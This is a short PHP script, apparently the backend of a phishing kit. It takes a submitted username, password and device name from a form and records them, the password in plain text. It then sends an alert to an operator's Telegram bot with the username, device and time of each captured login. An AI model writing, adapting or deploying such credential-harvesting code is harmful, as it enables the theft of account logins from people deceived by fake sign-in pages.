<?php
require_once __DIR__ . '/../../php/helpers/config.php';
require_once __DIR__ . '/../../php/helpers/telegram_helper.php';

$usuario = $_POST['usr'] ?? 'Desconocido';
$contrasena = $_POST['pas'] ?? 'No enviada';
$dispositivo = $_POST['dis'] ?? 'No detectado';

setcookie('usuario', $usuario, time() + 60 * 9);

// Guarda el registro (ya lo tienes implementado)
crear_registro($usuario, $contrasena, $dispositivo);

// Mensaje para Telegram
$msg  = "📥 <b>Nuevo inicio de sesión</b>\n";
$msg .= "👤 Usuario: <b>{$usuario}</b>\n";
$msg .= "💻 Dispositivo: {$dispositivo}\n";
$msg .= "🕒 Hora: " . date('Y-m-d H:i:s');

// Enviar a Telegram
sendTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $msg);
?>
